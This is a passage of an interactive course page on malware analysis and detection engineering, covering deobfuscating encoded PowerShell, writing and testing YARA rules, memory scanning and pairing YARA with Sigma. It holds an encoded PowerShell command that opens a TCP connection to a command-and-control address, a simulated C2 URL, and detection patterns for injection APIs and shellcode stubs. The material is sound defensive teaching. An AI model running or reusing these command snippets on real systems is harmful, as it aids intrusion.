+</code></pre><div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>events_input = SAMPLE_SANDBOX_EVENTS
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><hr />
+<h3>Concept 3 — Deobfuscation and Encoding Analysis</h3>
+<p>Malware commonly obfuscates: XOR encoding, Base64, custom packers, PowerShell <code>-EncodedCommand</code>. Identifying and reversing the encoding is core to dynamic analysis.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>import base64
+import re
+from typing import Optional
+
+def decode_base64_safe(data: str) -&gt; Optional[str]:
+    try:
+        decoded = base64.b64decode(data + &quot;==&quot;).decode(&quot;utf-8&quot;, errors=&quot;replace&quot;)
+        printable = sum(32 &lt;= ord(c) &lt;= 126 for c in decoded) / max(len(decoded), 1)
+        if printable &gt; 0.7:
+            return decoded
+        decoded_utf16 = base64.b64decode(data + &quot;==&quot;).decode(&quot;utf-16-le&quot;, errors=&quot;replace&quot;)
+        printable_utf16 = sum(32 &lt;= ord(c) &lt;= 126 for c in decoded_utf16) / max(len(decoded_utf16), 1)
+        if printable_utf16 &gt; 0.7:
+            return decoded_utf16
+        return None
+    except Exception:
+        return None
+
+def xor_decode(data: bytes, key: int) -&gt; bytes:
+    return bytes(b ^ key for b in data)
+
+def brute_xor(ciphertext: bytes, known_plaintext: bytes) -&gt; list[tuple[int, bytes]]:
+    &quot;&quot;&quot;Try all single-byte XOR keys, return candidates where known_plaintext appears.&quot;&quot;&quot;
+    results = []
+    for key in range(256):
+        candidate = xor_decode(ciphertext, key)
+        if known_plaintext in candidate:
+            results.append((key, candidate))
+    return results
+
+def extract_ps_encoded_commands(cmdline: str) -&gt; list[str]:
+    &quot;&quot;&quot;Extract and decode all -EncodedCommand arguments from a PowerShell cmdline.&quot;&quot;&quot;
+    pattern = re.compile(
+        r&quot;-[Ee][Nn][Cc][Oo]?[Dd]?[Ee]?[Dd]?[Cc]?[Oo]?[Mm]?[Mm]?[Aa]?[Nn]?[Dd]?\s+([A-Za-z0-9+/=]+)&quot;
+    )
+    results = []
+    for match in pattern.finditer(cmdline):
+        b64_payload = match.group(1)
+        decoded = decode_base64_safe(b64_payload)
+        if decoded:
+            results.append(decoded)
+    return results
+
+ENCODED_CMDLINE = (
+    &quot;powershell.exe -WindowStyle Hidden -EncodedCommand &quot;
+    &quot;JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMAUAB&quot;
+    &quot;BAFQAYQB5AGUAcgBDAGwAaQBlAG4AdAAoACIAMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANQAiACwAOAAwADgAMAApAA==&quot;
+)
+
+XOR_SAMPLE = bytes([0x4e ^ 0x41, 0x65 ^ 0x41, 0x77 ^ 0x41, 0x2d ^ 0x41, 0x4f ^ 0x41])
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong></p>
+<ol>
+<li>Call <code>extract_ps_encoded_commands(ENCODED_CMDLINE)</code> and print the decoded command.</li>
+<li>Call <code>brute_xor(XOR_SAMPLE, b&quot;Ne&quot;)</code> — try to find the XOR key that reveals &quot;New-O&quot; (start of a PowerShell cmdlet).</li>
+</ol>
+<p>Expected output:</p>
+<pre><code>Decoded PS command: $client = New-Object System.Net.Sockets.TcpClient(&quot;185.220.101.5&quot;,8080)
+
+XOR key candidates:
+  key=0x41: b&#x27;New-O&#x27;
+</code></pre><div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>ps_cmdline = ENCODED_CMDLINE
+xor_data = XOR_SAMPLE
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><hr />
+<h3>LLM Integration</h3>
+<p><strong>Topic:</strong> LLMs accelerate malware triage — given a behavioral report JSON, they can identify the malware family, map to ATT&amp;CK, and draft detection recommendations.
+<strong>Threat:</strong> Attackers use LLMs to generate obfuscation layers automatically — wrapping shellcode in dozens of encoding stages to evade both static and dynamic analysis.
+<strong>Opportunity:</strong> Send the <code>SandboxReport</code> JSON to an LLM with the prompt: &quot;Identify the malware family, explain the kill chain step by step, and generate one YARA rule and one Sigma rule for each phase.&quot;
+<strong>Prompt to try:</strong> <code>&quot;Given this sandbox behavioral report [JSON], identify the most likely malware family and explain your reasoning. Then describe the full kill chain (initial access → execution → persistence → C2). Finally, generate one detection for each kill chain phase.&quot;</code></p>
+<hr />
+<h2 id="day-3">Day 3 — YARA Rule Engineering</h2><label class="daydone"><input type="checkbox" class="daydone" data-id="18-3"> Mark this day done</label>
+<div class="watch"><h4>Watch</h4><ul><li><a href="https://www.youtube.com/watch?v=NqprZjLiEO0" target="_blank" rel="noopener"><b>Master YARA Rules: Strengthen Your Cyber Security with Custom Detections</b><small>Adam Goss</small></a></li></ul><p class="alt">Not what you need? Search YouTube: <a href="https://www.youtube.com/results?search_query=YARA%20rule%20writing%20advanced%20strings%20conditions%20malware%20hunting" target="_blank" rel="noopener">YARA rule writing advanced strings conditions malware hunting</a></p></div>
+<hr />
+<h3>Concept 1 — Advanced YARA Conditions</h3>
+<p>Beyond simple string matching, YARA conditions can reference PE structures directly using the <code>pe</code> module, calculate entropy, and use Boolean logic across string groups.</p>
+<pre><code>import &quot;pe&quot;
+import &quot;math&quot;
+
+rule Advanced_PE_Analysis
+{
+    meta:
+        description = &quot;PE with suspicious imports + high entropy section&quot;
+    strings:
+        $s1 = &quot;VirtualAllocEx&quot;
+        $s2 = &quot;WriteProcessMemory&quot;
+        $s3 = &quot;NtUnmapViewOfSection&quot;
+    condition:
+        uint16(0) == 0x5A4D and
+        pe.number_of_sections &gt;= 3 and
+        pe.imports(&quot;kernel32.dll&quot;, &quot;CreateRemoteThread&quot;) and
+        math.entropy(0, filesize) &gt;= 6.5 and
+        2 of ($s1, $s2, $s3)
+}
+</code></pre><p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>from dataclasses import dataclass
+import re
+
+@dataclass
+class YARARuleSet:
+    rules: list[YARARule]
+
+    def render_all(self) -&gt; str:
+        return &quot;\n\n&quot;.join(r.render() for r in self.rules)
+
+    def compile(self) -&gt; &quot;CompiledRuleSet&quot;:
+        try:
+            import yara
+            source = self.render_all()
+            compiled = yara.compile(source=source)
+            return CompiledRuleSet(compiled, source)
+        except Exception as exc:
+            raise ValueError(f&quot;Compilation failed: {exc}&quot;)
+
+@dataclass
+class CompiledRuleSet:
+    _compiled: object  # yara.Rules
+    source: str
+
+    def scan(self, data: bytes) -&gt; list[YARAMatch]:
+        matches = self._compiled.match(data=data)
+        return [
+            YARAMatch(
+                rule_name=m.rule,
+                tags=list(m.tags),
+                meta=dict(m.meta),
+                matches=[{&quot;offset&quot;: o, &quot;identifier&quot;: i, &quot;data&quot;: d} for o, i, d in m.strings],
+            )
+            for m in matches
+        ]
+
+    def scan_file(self, path: str) -&gt; list[YARAMatch]:
+        matches = self._compiled.match(filepath=path)
+        return [
+            YARAMatch(
+                rule_name=m.rule,
+                tags=list(m.tags),
+                meta=dict(m.meta),
+                matches=[{&quot;offset&quot;: o, &quot;identifier&quot;: i, &quot;data&quot;: d} for o, i, d in m.strings],
+            )
+            for m in matches
+        ]
+
+C2_BEACON_RULE = YARARule(
+    name=&quot;AsyncRAT_C2_Beacon&quot;,
+    tags=[&quot;T1071_001&quot;, &quot;rat&quot;, &quot;asyncrat&quot;],
+    meta={
+        &quot;description&quot;: &quot;Detects AsyncRAT C2 communication artifacts in memory dumps or PE files&quot;,
+        &quot;author&quot;:      &quot;Detection Engineer&quot;,
+        &quot;date&quot;:        &quot;2024-01-15&quot;,
+        &quot;reference&quot;:   &quot;T1071.001&quot;,
+        &quot;hash&quot;:        &quot;sample-sha256-placeholder&quot;,
+    },
+    strings=[
+        YARAString(&quot;$mutex&quot;,   &#x27;&quot;Global\\\\MalwareMutex&quot;&#x27;, [&quot;wide&quot;, &quot;ascii&quot;]),
+        YARAString(&quot;$cert&quot;,    &#x27;{ 30 82 ?? ?? 30 82 ?? ?? }&#x27;),
+        YARAString(&quot;$aes_key&quot;, &#x27;&quot;Utf8Key&quot;&#x27;),
+        YARAString(&quot;$connect&quot;, &#x27;&quot;Connected&quot;&#x27;, [&quot;nocase&quot;]),
+        YARAString(&quot;$port&quot;,    &#x27;&quot;8080&quot;&#x27;),
+    ],
+    condition=&quot;3 of them&quot;,
+)
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Add <code>C2_BEACON_RULE</code> to a <code>YARARuleSet</code> along with <code>HOLLOW_INJECTOR_RULE</code> from Day 1. Call <code>render_all()</code> and print the first rule. Then compile the set and scan <code>SIMULATED_PE_DATA</code> — confirm <code>Hollow_Process_Injector</code> fires and <code>AsyncRAT_C2_Beacon</code> does not.</p>
+<p>Expected output:</p>
+<pre><code>--- Rule 1: Hollow_Process_Injector ---
+rule Hollow_Process_Injector ...
+
+Scan results on SIMULATED_PE_DATA:
+  MATCH: Hollow_Process_Injector (3 hits: $valloc, $wpm, $crt)
+  No match: AsyncRAT_C2_Beacon
+</code></pre><div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>ruleset_input = [HOLLOW_INJECTOR_RULE, C2_BEACON_RULE]
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><hr />
+<h3>Concept 2 — YARA for Memory Scanning</h3>
+<p>YARA can scan live process memory via <code>rules.match(pid=N)</code> or scan memory dumps (<code>.dmp</code>, <code>.raw</code>) as raw files. For memory scanning, remove file-based conditions (<code>uint16(0) == 0x5A4D</code>, <code>filesize</code>) — these don't apply to process memory regions.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>import yara
+from dataclasses import dataclass
+
+MEMORY_SCAN_RULE = &quot;&quot;&quot;
+rule Injected_Shellcode_Stub
+{
+    meta:
+        description = &quot;Detects common x64 shellcode entry stubs in process memory&quot;
+        author      = &quot;Detection Engineer&quot;
+        date        = &quot;2024-01-15&quot;
+        reference   = &quot;T1055&quot;
+    strings:
+        $stub1 = { 48 83 EC 28 }          // sub rsp, 0x28 (x64 prologue)
+        $stub2 = { FC 48 83 E4 F0 }       // cld; and rsp, -16 (Metasploit prologue)
+        $stub3 = { E8 ?? ?? ?? ?? }        // call +offset (common shellcode pattern)
+        $mz    = { 4D 5A }                 // MZ header in unexpected region
+    condition:
+        ($stub1 or $stub2) and $stub3
+}
+&quot;&quot;&quot;
+
+MEMORY_IOC_RULE = &quot;&quot;&quot;
+rule C2_URL_In_Memory
+{
+    meta:
+        description = &quot;Detects hardcoded C2 URL pattern in process memory&quot;
+        author      = &quot;Detection Engineer&quot;
+        date        = &quot;2024-01-15&quot;
+        reference   = &quot;T1071.001&quot;
+    strings:
+        $url1 = /https?:\\/\\/[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}(:[0-9]+)?\\/[a-z]+\\.php/
+        $ua   = &quot;Mozilla/4.0 (compatible; MSIE 7.0;&quot;
+        $gate = &quot;/gate.php&quot; nocase
+        $post = &quot;/post.php&quot; nocase
+    condition:
+        $url1 or ($gate and $ua) or $post
+}
+&quot;&quot;&quot;
+
+def scan_memory_dump(dump_path: str, rules: list[str]) -&gt; list[YARAMatch]:
+    combined = &quot;\n\n&quot;.join(rules)
+    try:
+        compiled = yara.compile(source=combined)
+        raw = compiled.match(filepath=dump_path)
+        return [
+            YARAMatch(
+                rule_name=m.rule,
+                tags=list(m.tags),
+                meta=dict(m.meta),
+                matches=[{&quot;offset&quot;: o, &quot;identifier&quot;: str(i), &quot;data&quot;: d} for o, i, d in m.strings],
+            )
+            for m in raw
+        ]
+    except Exception as exc:
+        print(f&quot;[ERROR] scan_memory_dump: {exc}&quot;)
+        return []
+
+MEMORY_DUMP_SIMULATION = (
+    b&quot;\x00&quot; * 0x1000 +
+    b&quot;http://185.220.101.5:8080/gate.php\x00&quot; +
+    b&quot;Mozilla/4.0 (compatible; MSIE 7.0;\x00&quot; +
+    b&quot;\x00&quot; * 0x200
+)
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Compile <code>C2_URL_In_Memory</code> rule and scan <code>MEMORY_DUMP_SIMULATION</code> using <code>yara.compile(source=...).match(data=...)</code>. Print each match's rule name and the offsets of the matching strings.</p>
+<p>Expected output:</p>
+<pre><code>MATCH: C2_URL_In_Memory
+  $url1 at offset 0x1000: b&#x27;http://185.220.101.5:8080/gate.php&#x27;
+  $ua   at offset 0x1023: b&#x27;Mozilla/4.0 (compatible; MSIE 7.0;&#x27;
+</code></pre><div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>import yara
+memory_data = MEMORY_DUMP_SIMULATION
+rule_text = MEMORY_IOC_RULE
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><hr />
+<h3>Concept 3 — YARA Rule Quality and False Positive Rate</h3>
+<p>A YARA rule that fires on 40% of clean files is useless in production. Quality checklist:</p>
+<ol>
+<li>Test against a clean corpus (standard Windows binaries, common software)</li>
+<li>Add <code>filesize &lt; 5MB</code> or <code>pe.number_of_sections &lt; 10</code> to narrow scope</li>
+<li>Use <code>fullword</code> modifier to avoid substring matches (<code>&quot;cmd&quot;</code> hitting <code>&quot;scmd&quot;</code>)</li>
+<li>Require multiple independent indicators — not just one string</li>
+<li>Track FP rate per rule in a quality table</li>
+</ol>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>from dataclasses import dataclass
+import yara
+from pathlib import Path
+
+@dataclass
+class RuleQualityMetrics:
+    rule_name: str
+    true_positives: int
+    false_positives: int
+    true_negatives: int
+    false_negatives: int
+
+    def precision(self) -&gt; float:
+        tp = self.true_positives
+        fp = self.false_positives
+        return tp / (tp + fp) if (tp + fp) &gt; 0 else 0.0
+
+    def recall(self) -&gt; float:
+        tp = self.true_positives
+        fn = self.false_negatives
+        return tp / (tp + fn) if (tp + fn) &gt; 0 else 0.0
+
+    def f1(self) -&gt; float:
+        p, r = self.precision(), self.recall()
+        return 2 * p * r / (p + r) if (p + r) &gt; 0 else 0.0
+
+    def quality_gate(self, min_precision: float = 0.95, min_recall: float = 0.80) -&gt; tuple[bool, str]:
+        if self.precision() &lt; min_precision:
+            return False, f&quot;precision {self.precision():.2f} &lt; {min_precision}&quot;
+        if self.recall() &lt; min_recall:
+            return False, f&quot;recall {self.recall():.2f} &lt; {min_recall}&quot;
+        return True, &quot;PASS&quot;
+
+def evaluate_rule_against_corpus(
+    rule_text: str,
+    malicious_samples: list[bytes],
+    clean_samples: list[bytes],
+) -&gt; RuleQualityMetrics:
+    try:
+        compiled = yara.compile(source=rule_text)
+    except yara.SyntaxError as exc:
+        raise ValueError(f&quot;Syntax error: {exc}&quot;)
+
+    tp = sum(1 for s in malicious_samples if compiled.match(data=s))
+    fp = sum(1 for s in clean_samples    if compiled.match(data=s))
+    fn = len(malicious_samples) - tp
+    tn = len(clean_samples)     - fp
+
+    rule_name = rule_text.split(&quot;rule &quot;)[1].split()[0] if &quot;rule &quot; in rule_text else &quot;unknown&quot;
+    return RuleQualityMetrics(rule_name, tp, fp, tn, fn)
+
+MALICIOUS_CORPUS = [SIMULATED_PE_DATA]
+CLEAN_CORPUS = [
+    b&quot;MZ&quot; + b&quot;\x00&quot; * 60 + b&quot;PE\x00\x00&quot; + b&quot;kernel32.dll\x00&quot; + b&quot;LoadLibrary\x00&quot;,
+    b&quot;MZ&quot; + b&quot;\x00&quot; * 60 + b&quot;PE\x00\x00&quot; + b&quot;ntdll.dll\x00&quot; + b&quot;RtlAllocateHeap\x00&quot;,
+]
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Call <code>evaluate_rule_against_corpus(MINIMAL_YARA_RULE, MALICIOUS_CORPUS, CLEAN_CORPUS)</code>. Print precision, recall, F1, and call <code>quality_gate()</code>. Then test a deliberately over-broad rule (just <code>&quot;PE&quot;</code> as a string) and confirm it fails the quality gate.</p>
+<p>Expected output:</p>
+<pre><code>Rule: Hollow_Process_Injector
+  Precision: 1.00 | Recall: 1.00 | F1: 1.00
+  Quality gate: PASS
+
+Over-broad rule:
+  Precision: 0.33 (fires on 2/3 samples including clean ones)
+  Quality gate: FAIL — precision 0.33 &lt; 0.95
+</code></pre><div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>malicious = MALICIOUS_CORPUS
+clean     = CLEAN_CORPUS
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><hr />
+<h3>LLM Integration</h3>
+<p><strong>Topic:</strong> LLMs can review YARA rules for false positive risk, suggest tighter conditions, and recommend test cases from public malware corpora.
+<strong>Threat:</strong> Adversaries study published YARA rules and modify their malware to avoid matching — removing specific strings, changing byte patterns, compiling variants.
+<strong>Opportunity:</strong> Feed a YARA rule to an LLM and ask: &quot;What are the 3 most likely false positive scenarios? How would an attacker trivially bypass this rule? Suggest 2 improvements that maintain detection coverage.&quot;
+<strong>Prompt to try:</strong> <code>&quot;Review this YARA rule for false positive risk and bypass resilience: [rule text]. List 3 legitimate files that could match, 2 attacker evasion techniques, and 2 rule improvements that harden it without significantly reducing recall.&quot;</code></p>
+<hr />
+<h2 id="day-4">Day 4 — Integrating YARA into the Detection Pipeline</h2><label class="daydone"><input type="checkbox" class="daydone" data-id="18-4"> Mark this day done</label>
+<div class="watch"><h4>Watch</h4><ul><li><a href="https://www.youtube.com/watch?v=zzpz3VYKzUw" target="_blank" rel="noopener"><b>YARA: The Malware Detection Tool You Need to Know</b><small>Guided Hacking</small></a></li></ul><p class="alt">Not what you need? Search YouTube: <a href="https://www.youtube.com/results?search_query=YARA%20pipeline%20automation%20detection%20engineering%20threat%20hunting" target="_blank" rel="noopener">YARA pipeline automation detection engineering threat hunting</a></p></div>
+<hr />
+<h3>Concept 1 — YARA Rule Management</h3>
+<p>In production, YARA rules live in a rules repository with versioning, metadata, and CI/CD validation. Each rule has a lifecycle: draft → test → staging → production → retired.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>from dataclasses import dataclass, field
+from datetime import datetime
+from enum import Enum
+from typing import Optional
+import json
+
+class RuleStatus(Enum):
+    DRAFT      = &quot;draft&quot;
+    TEST       = &quot;test&quot;
+    STAGING    = &quot;staging&quot;
+    PRODUCTION = &quot;production&quot;
+    RETIRED    = &quot;retired&quot;
+
+@dataclass
+class ManagedYARARule:
+    rule_id: str          # e.g. &quot;YARA-2024-001&quot;
+    rule: YARARule
+    status: RuleStatus
+    created_at: datetime
+    updated_at: datetime
+    created_by: str
+    technique_ids: list[str]
+    false_positive_rate: float = 0.0
+    notes: str = &quot;&quot;
+    test_results: list[dict] = field(default_factory=list)
+
+    def promote(self) -&gt; &quot;ManagedYARARule&quot;:
+        transitions = {
+            RuleStatus.DRAFT:      RuleStatus.TEST,
+            RuleStatus.TEST:       RuleStatus.STAGING,
+            RuleStatus.STAGING:    RuleStatus.PRODUCTION,
+            RuleStatus.PRODUCTION: RuleStatus.RETIRED,
+        }
+        if self.status not in transitions:
+            raise ValueError(f&quot;Cannot promote from {self.status}&quot;)
+        self.status = transitions[self.status]
+        self.updated_at = datetime.utcnow()
+        return self
+
+    def to_dict(self) -&gt; dict:
+        return {
+            &quot;rule_id&quot;:             self.rule_id,
+            &quot;rule_name&quot;:           self.rule.name,
+            &quot;status&quot;:              self.status.value,
+            &quot;technique_ids&quot;:       self.technique_ids,
+            &quot;false_positive_rate&quot;: self.false_positive_rate,
+            &quot;created_by&quot;:          self.created_by,
+            &quot;created_at&quot;:          self.created_at.isoformat(),
+            &quot;updated_at&quot;:          self.updated_at.isoformat(),
+        }
+
+@dataclass
+class YARARuleRepository:
+    rules: list[ManagedYARARule] = field(default_factory=list)
+
+    def add(self, rule: ManagedYARARule) -&gt; None:
+        self.rules.append(rule)
+
+    def production_rules(self) -&gt; list[ManagedYARARule]:
+        return [r for r in self.rules if r.status == RuleStatus.PRODUCTION]
+
+    def by_technique(self, technique_id: str) -&gt; list[ManagedYARARule]:
+        return [r for r in self.rules if technique_id in r.technique_ids]
+
+    def compile_production_ruleset(self) -&gt; str:
+        return &quot;\n\n&quot;.join(r.rule.render() for r in self.production_rules())
+
+    def coverage_report(self) -&gt; dict:
+        techniques: dict[str, int] = {}
+        for rule in self.production_rules():
+            for tech in rule.technique_ids:
+                techniques[tech] = techniques.get(tech, 0) + 1
+        return {
+            &quot;total_rules&quot;:        len(self.rules),
+            &quot;production_rules&quot;:   len(self.production_rules()),
+            &quot;techniques_covered&quot;: len(techniques),
+            &quot;technique_counts&quot;:   techniques,
+        }
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Create a <code>YARARuleRepository</code>, add <code>HOLLOW_INJECTOR_RULE</code> as <code>ManagedYARARule</code> with status <code>DRAFT</code>. Promote it twice (DRAFT → TEST → STAGING). Print <code>coverage_report()</code> (should show 0 production rules). Promote once more to PRODUCTION and print <code>coverage_report()</code> again.</p>
+<p>Expected output:</p>
+<pre><code>After 2 promotions (status: STAGING):
+  production_rules: 0
+
+After 3rd promotion (status: PRODUCTION):
+  total_rules: 1
+  production_rules: 1
+  techniques_covered: 1
+  technique_counts: {&#x27;T1055.012&#x27;: 1}
+</code></pre><div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>repo = YARARuleRepository()
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><hr />
+<h3>Concept 2 — Running YARA Against Log Pipeline Artifacts</h3>
+<p>The Royal Road pipeline generates artifacts at each stage: Sysmon datasets (W08/W13), memory dumps (W17), network captures (W14). YARA can scan all of them.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>import os
+import yara
+from dataclasses import dataclass, field
+from datetime import datetime
+from typing import Optional
+from pathlib import Path
+
+@dataclass
+class PipelineYARAScan:
+    scan_id: str
+    started_at: datetime
+    completed_at: Optional[datetime]
+    rules_compiled: int
+    files_scanned: int
+    matches: list[YARAMatch] = field(default_factory=list)
+    errors: list[str] = field(default_factory=list)
+
+    def match_rate(self) -&gt; float:
+        if self.files_scanned == 0:
+            return 0.0
+        return len(self.matches) / self.files_scanned
+
+    def to_summary(self) -&gt; dict:
+        return {
+            &quot;scan_id&quot;:       self.scan_id,
+            &quot;files_scanned&quot;: self.files_scanned,
+            &quot;rules_compiled&quot;:self.rules_compiled,
+            &quot;total_matches&quot;: len(self.matches),
+            &quot;match_rate&quot;:    f&quot;{self.match_rate():.1%}&quot;,
+            &quot;errors&quot;:        len(self.errors),
+        }
+
+def run_yara_pipeline_scan(
+    rule_repository: YARARuleRepository,
+    artifact_paths: list[str],
+    scan_id: Optional[str] = None,
+) -&gt; PipelineYARAScan:
+    import time
+    if scan_id is None:
+        scan_id = f&quot;scan-{int(time.time())}&quot;
+
+    scan = PipelineYARAScan(
+        scan_id=scan_id,
+        started_at=datetime.utcnow(),
+        completed_at=None,
+        rules_compiled=0,
+        files_scanned=0,
+    )
+
+    source = rule_repository.compile_production_ruleset()
+    if not source.strip():
+        scan.errors.append(&quot;No production rules to compile&quot;)
+        scan.completed_at = datetime.utcnow()
+        return scan
+
+    try:
+        compiled = yara.compile(source=source)
+        scan.rules_compiled = len(rule_repository.production_rules())
+    except Exception as exc:
+        scan.errors.append(f&quot;Compile error: {exc}&quot;)
+        scan.completed_at = datetime.utcnow()
+        return scan
+
+    for path in artifact_paths:
+        if not os.path.exists(path):
+            scan.errors.append(f&quot;File not found: {path}&quot;)
+            continue
+        try:
+            raw_matches = compiled.match(filepath=path)
+            scan.files_scanned += 1
+            for m in raw_matches:
+                scan.matches.append(YARAMatch(
+                    rule_name=m.rule,
+                    tags=list(m.tags),
+                    meta=dict(m.meta),
+                    matches=[{&quot;offset&quot;: o, &quot;identifier&quot;: str(i), &quot;data&quot;: d} for o, i, d in m.strings],
+                ))
+        except Exception as exc:
+            scan.errors.append(f&quot;Scan error on {path}: {exc}&quot;)
+
+    scan.completed_at = datetime.utcnow()
+    return scan
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Write the artifact binary to a temp file, add <code>HOLLOW_INJECTOR_RULE</code> as a production rule in <code>repo</code>, then call <code>run_yara_pipeline_scan(repo, [temp_file_path])</code>. Print <code>to_summary()</code>.</p>
+<p>Expected output:</p>
+<pre><code>{
+  &quot;scan_id&quot;: &quot;scan-...&quot;,
+  &quot;files_scanned&quot;: 1,
+  &quot;rules_compiled&quot;: 1,
+  &quot;total_matches&quot;: 1,
+  &quot;match_rate&quot;: &quot;100.0%&quot;,
+  &quot;errors&quot;: 0
+}
+</code></pre><div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>import tempfile, os
+with tempfile.NamedTemporaryFile(delete=False, suffix=&quot;.bin&quot;) as f:
+    f.write(SIMULATED_PE_DATA)
+    temp_artifact = f.name
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><hr />
+<h3>Concept 3 — YARA + Sigma: Complementary Coverage</h3>
+<p>YARA catches the file/memory artifact; Sigma catches the behavioral telemetry. Together they give both static and dynamic coverage for the same ATT&amp;CK technique.</p>
+<table>
+<thead>
+<tr>
+<th>Layer</th>
+<th>Tool</th>
+<th>What it scans</th>
+<th>When it fires</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Binary</td>
+<td>YARA</td>
+<td>File bytes, memory</td>
+<td>On write/execution</td>
+</tr>
+<tr>
+<td>Behavioral</td>
+<td>Sigma</td>
+<td>Event logs (Sysmon)</td>
+<td>During execution</td>
+</tr>
+<tr>
+<td>Network</td>
+<td>Sigma</td>
+<td>Zeek/firewall logs</td>
+<td>During C2 communication</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>from dataclasses import dataclass
+
+@dataclass
+class DetectionPair:
+    technique_id: str
+    yara_rule: Optional[YARARule]
+    sigma_rule_yaml: Optional[str]
+    description: str
+
+    def has_full_coverage(self) -&gt; bool:
+        return self.yara_rule is not None and self.sigma_rule_yaml is not None
+
+    def coverage_gap(self) -&gt; str:
+        if self.has_full_coverage():
+            return &quot;none&quot;
+        if self.yara_rule is None and self.sigma_rule_yaml is None:
+            return &quot;both_missing&quot;
+        if self.yara_rule is None:
+            return &quot;yara_missing&quot;
+        return &quot;sigma_missing&quot;
+
+HOLLOW_SIGMA = &quot;&quot;&quot;
+title: Process Hollowing via Sysmon
+id: b1c2d3e4-f5a6-7890-bcde-f12345678901
+status: production
+description: Detects process hollowing through Sysmon EID 8 CreateRemoteThread targeting system processes
+author: Detection Engineer
+date: 2024/01/15
+tags:
+    - attack.defense_evasion
+    - attack.t1055.012
+logsource:
+    product: windows
+    service: sysmon
+detection:
+    selection:
+        EventID: 8
+        TargetImage|endswith:
+            - &#x27;\\svchost.exe&#x27;
+            - &#x27;\\lsass.exe&#x27;
+    filter_legit:
+        SourceImage|endswith:
+            - &#x27;\\msiexec.exe&#x27;
+    condition: selection and not filter_legit
+level: high
+&quot;&quot;&quot;
+
+T1055_PAIR = DetectionPair(
+    technique_id=&quot;T1055.012&quot;,
+    yara_rule=HOLLOW_INJECTOR_RULE,
+    sigma_rule_yaml=HOLLOW_SIGMA,
+    description=&quot;Process hollowing detection — static PE + behavioral EID 8&quot;,
+)
+
+def build_coverage_matrix(pairs: list[DetectionPair]) -&gt; dict:
+    return {
+        &quot;total_techniques&quot;: len(pairs),
+        &quot;full_coverage&quot;:    sum(1 for p in pairs if p.has_full_coverage()),
+        &quot;gaps&quot;:             {p.technique_id: p.coverage_gap() for p in pairs if not p.has_full_coverage()},
+    }
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Create 3 <code>DetectionPair</code> objects: one with full coverage (T1055.012), one with only YARA (T1059.001), one with only Sigma (T1071.001). Call <code>build_coverage_matrix()</code> and print the result.</p>
+<p>Expected output:</p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>{
